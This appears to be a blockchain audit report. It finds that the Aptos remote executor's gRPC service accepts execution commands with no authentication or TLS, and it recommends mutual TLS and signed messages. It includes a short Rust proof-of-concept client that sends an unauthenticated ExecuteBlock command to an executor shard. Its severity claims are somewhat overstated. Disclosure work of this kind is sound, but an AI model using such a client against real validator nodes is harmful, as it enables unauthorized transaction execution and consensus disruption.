# Audit Report

## Title
Authentication Bypass in Remote Executor Service Allows Unauthorized Transaction Execution

## Summary
The Remote Executor Service's `NetworkMessage` protobuf struct contains no authentication or signature fields, and the gRPC service implementation performs no authentication checks. This allows any network peer capable of reaching the executor service endpoint to send arbitrary execution commands, leading to unauthorized transaction execution on validator nodes.

## Finding Description

The remote executor service uses a protobuf-defined `NetworkMessage` struct that contains only two fields: raw message bytes and a message type string, with no authentication credentials. [1](#0-0) 

The gRPC service implementation in `GRPCNetworkMessageServiceServerWrapper` accepts incoming messages without any authentication checks. The `simple_msg_exchange` method extracts the remote address for logging but performs no validation of the sender's identity or authorization. [2](#0-1) 

The service connects using plain HTTP without TLS, providing no transport-level security: [3](#0-2) 

When the `RemoteCoordinatorClient` receives messages, it directly deserializes them as `RemoteExecutionRequest` and processes them without any authentication or authorization checks: [4](#0-3) 

The `RemoteExecutionRequest::ExecuteBlock` contains `ExecuteBlockCommand` with transaction sub-blocks, concurrency level, and onchain configuration. This command is converted directly into an `ExecutorShardCommand::ExecuteSubBlocks` and executed by the `ShardedExecutorService`. [5](#0-4) 

The `ProcessExecutorService` is designed for production deployment as a standalone process, accepting network addresses via command-line arguments: [6](#0-5) 

**Attack Flow:**
1. Attacker connects to the exposed gRPC endpoint (e.g., due to misconfiguration or network breach)
2. Attacker crafts a malicious `RemoteExecutionRequest::ExecuteBlock` with arbitrary transactions
3. Attacker serializes the request using BCS and sends it via the `simple_msg_exchange` RPC
4. The `RemoteCoordinatorClient` deserializes and processes the request without authentication
5. The malicious transactions are executed by the `ShardedExecutorService`

This breaks the **Access Control** invariant (system addresses and critical operations must be protected) and potentially the **Deterministic Execution** invariant if different shards receive different malicious commands from an attacker.

## Impact Explanation

This vulnerability qualifies as **Critical Severity** under the Aptos Bug Bounty program for the following reasons:

1. **Remote Code Execution on Validator Node**: An attacker can execute arbitrary transactions on the executor node, meeting the "Remote Code Execution on validator node" criterion.

2. **Consensus Safety Violations**: By sending different execution commands to different shards, an attacker could cause non-deterministic execution results, potentially leading to state divergence and consensus failures.

3. **Loss of Liveness**: An attacker could send malformed or resource-exhausting execution commands to cause executor shards to crash or hang, resulting in network availability loss.

4. **State Manipulation**: The attacker can influence transaction execution order, gas consumption, and state changes, potentially causing state inconsistencies that require manual intervention.

The complete absence of authentication mechanisms, combined with the service being production-ready and capable of executing arbitrary transaction blocks, makes this a critical vulnerability that could compromise validator node security and blockchain integrity.

## Likelihood Explanation

**Likelihood: Medium to High**

While the service may be intended for deployment on trusted internal networks, several factors increase the likelihood of exploitation:

1. **No Defense in Depth**: Even on "trusted" networks, the complete lack of authentication violates security best practices. Internal networks can be compromised through various attack vectors.

2. **Misconfiguration Risk**: The service accepts arbitrary socket addresses from command-line arguments with no validation or security warnings in documentation. Operators could accidentally expose it to untrusted networks.

3. **Network Breach**: If an attacker gains access to the internal network (through VPN compromise, insider threat, or other means), they can immediately exploit this vulnerability without any additional authentication hurdles.

4. **No Security Documentation**: The absence of clear security warnings about deployment requirements increases the risk of unsafe configurations.

5. **Production Deployment Model**: This is not experimental code—it has a production entry point with full deployment infrastructure, making it more likely to be used in environments where misconfiguration could occur.

The attack complexity is low once network access is achieved—the attacker only needs to craft a properly formatted BCS-serialized protobuf message.

## Recommendation

Implement mutual TLS authentication with certificate-based peer verification for all remote executor communication. The fix should include:

1. **Add Authentication Fields to Proto**: Extend the NetworkMessage to include authentication information:
```protobuf
message NetworkMessage {
  bytes message = 1;
  string message_type = 2;
  bytes signature = 3;  // Ed25519 signature over message
  bytes peer_id = 4;    // Authenticated peer identifier
}
```

2. **Implement TLS in gRPC Service**: Modify the gRPC service to use mTLS with certificate validation:
   - Configure `Server::builder()` with TLS credentials
   - Validate client certificates against a trusted peer set
   - Reject connections from unknown peers

3. **Add Signature Verification**: Implement cryptographic signature verification:
   - Each message must be signed with the sender's private key
   - Recipients verify signatures using the sender's known public key
   - Reject unsigned or invalidly signed messages

4. **Use Trusted Peer Set**: Maintain a configured list of authorized peer identities:
   - Load trusted peer public keys from configuration
   - Verify incoming connections are from known peers
   - Log and reject unauthorized connection attempts

5. **Security Documentation**: Add clear deployment documentation:
   - Warn about security implications of exposing the service
   - Provide secure configuration examples
   - Document the authentication and authorization model

6. **Network Binding Validation**: Validate socket addresses and warn on potentially unsafe bindings:
   - Detect binding to 0.0.0.0 or public interfaces
   - Require explicit configuration flags for non-localhost binding

## Proof of Concept

```rust
// PoC: Malicious client that sends unauthorized execution command
// Compile with: cargo build --example malicious_executor_client

use aptos_executor_service::{ExecuteBlockCommand, RemoteExecutionRequest};
use aptos_protos::remote_executor::v1::{
    network_message_service_client::NetworkMessageServiceClient,
    NetworkMessage,
};
use aptos_types::block_executor::{
    config::BlockExecutorConfigFromOnchain,
    partitioner::SubBlocksForShard,
};
use std::net::SocketAddr;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Target remote executor shard endpoint
    let target_addr = "127.0.0.1:52201"; // Example shard address
    
    // Create gRPC client (no authentication required!)
    let mut client = NetworkMessageServiceClient::connect(
        format!("http://{}", target_addr)
    ).await?;
    
    // Craft malicious execution command
    let malicious_command = RemoteExecutionRequest::ExecuteBlock(
        ExecuteBlockCommand {
            sub_blocks: SubBlocksForShard::new(vec![]), // Malicious transactions here
            concurrency_level: 1,
            onchain_config: BlockExecutorConfigFromOnchain::default(),
        }
    );
    
    // Serialize command
    let message_bytes = bcs::to_bytes(&malicious_command)?;
    
    // Send unauthorized command (no signature, no authentication!)
    let request = tonic::Request::new(NetworkMessage {
        message: message_bytes,
        message_type: "execute_command_0".to_string(), // Target shard 0
    });
    
    // This succeeds without any authentication check!
    let response = client.simple_msg_exchange(request).await?;
    println!("Malicious command accepted: {:?}", response);
    
    Ok(())
}
```

This PoC demonstrates that any network peer can:
1. Connect to the executor service gRPC endpoint
2. Craft arbitrary `ExecuteBlockCommand` messages
3. Send them without any authentication
4. Have them executed by the remote executor shard

The attack requires only network connectivity to the service endpoint—no credentials, signatures, or authorization tokens are needed.

---

**Notes:**

This vulnerability is particularly concerning because:
- The `NetworkController` infrastructure used by the executor service is completely separate from Aptos's main authenticated network layer (`network/framework`)
- While validator-to-validator consensus communication uses the Noise protocol with mutual authentication, the remote executor service uses a simpler gRPC-based networking layer with no authentication
- The service is production-ready code intended for distributed sharded execution deployments
- No compensating controls (TLS, authentication tokens, IP allowlists) are implemented in the codebase

Even if intended for trusted network deployment, defense-in-depth principles require authentication mechanisms to protect against misconfiguration and internal network breaches.

### Citations

**File:** protos/rust/src/pb/aptos.remote_executor.v1.rs (L7-13)
```rust
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct NetworkMessage {
    #[prost(bytes="vec", tag="1")]
    pub message: ::prost::alloc::vec::Vec<u8>,
    #[prost(string, tag="2")]
    pub message_type: ::prost::alloc::string::String,
}
```

**File:** secure/net/src/grpc_network_service/mod.rs (L91-116)
```rust
#[tonic::async_trait]
impl NetworkMessageService for GRPCNetworkMessageServiceServerWrapper {
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
}
```

**File:** secure/net/src/grpc_network_service/mod.rs (L124-138)
```rust
    pub fn new(rt: &Runtime, remote_addr: SocketAddr) -> Self {
        Self {
            remote_addr: remote_addr.to_string(),
            remote_channel: rt
                .block_on(async { Self::get_channel(format!("http://{}", remote_addr)).await }),
        }
    }

    async fn get_channel(remote_addr: String) -> NetworkMessageServiceClient<Channel> {
        info!("Trying to connect to remote server at {:?}", remote_addr);
        let conn = tonic::transport::Endpoint::new(remote_addr)
            .unwrap()
            .connect_lazy();
        NetworkMessageServiceClient::new(conn).max_decoding_message_size(MAX_MESSAGE_SIZE)
    }
```

**File:** execution/executor-service/src/remote_cordinator_client.rs (L80-113)
```rust
    fn receive_execute_command(&self) -> ExecutorShardCommand<RemoteStateViewClient> {
        match self.command_rx.recv() {
            Ok(message) => {
                let _rx_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx"])
                    .start_timer();
                let bcs_deser_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx_bcs_deser"])
                    .start_timer();
                let request: RemoteExecutionRequest = bcs::from_bytes(&message.data).unwrap();
                drop(bcs_deser_timer);

                match request {
                    RemoteExecutionRequest::ExecuteBlock(command) => {
                        let init_prefetch_timer = REMOTE_EXECUTOR_TIMER
                            .with_label_values(&[&self.shard_id.to_string(), "init_prefetch"])
                            .start_timer();
                        let state_keys = Self::extract_state_keys(&command);
                        self.state_view_client.init_for_block(state_keys);
                        drop(init_prefetch_timer);

                        let (sub_blocks, concurrency, onchain_config) = command.into();
                        ExecutorShardCommand::ExecuteSubBlocks(
                            self.state_view_client.clone(),
                            sub_blocks,
                            concurrency,
                            onchain_config,
                        )
                    },
                }
            },
            Err(_) => ExecutorShardCommand::Stop,
        }
    }
```

**File:** execution/executor-service/src/lib.rs (L43-65)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub enum RemoteExecutionRequest {
    ExecuteBlock(ExecuteBlockCommand),
}

#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct ExecuteBlockCommand {
    pub(crate) sub_blocks: SubBlocksForShard<AnalyzedTransaction>,
    pub(crate) concurrency_level: usize,
    pub(crate) onchain_config: BlockExecutorConfigFromOnchain,
}

impl ExecuteBlockCommand {
    pub fn into(
        self,
    ) -> (
        SubBlocksForShard<AnalyzedTransaction>,
        usize,
        BlockExecutorConfigFromOnchain,
    ) {
        (self.sub_blocks, self.concurrency_level, self.onchain_config)
    }
}
```

**File:** execution/executor-service/src/main.rs (L9-48)
```rust
#[derive(Debug, Parser)]
struct Args {
    #[clap(long, default_value_t = 8)]
    pub num_executor_threads: usize,

    #[clap(long)]
    pub shard_id: usize,

    #[clap(long)]
    pub num_shards: usize,

    #[clap(long, num_args = 1..)]
    pub remote_executor_addresses: Vec<SocketAddr>,

    #[clap(long)]
    pub coordinator_address: SocketAddr,
}

fn main() {
    let args = Args::parse();
    aptos_logger::Logger::new().init();

    let (tx, rx) = crossbeam_channel::unbounded();
    ctrlc::set_handler(move || {
        tx.send(()).unwrap();
    })
    .expect("Error setting Ctrl-C handler");

    let _exe_service = ProcessExecutorService::new(
        args.shard_id,
        args.num_shards,
        args.num_executor_threads,
        args.coordinator_address,
        args.remote_executor_addresses,
    );

    rx.recv()
        .expect("Could not receive Ctrl-C msg from channel.");
    info!("Process executor service shutdown successfully.");
}
```
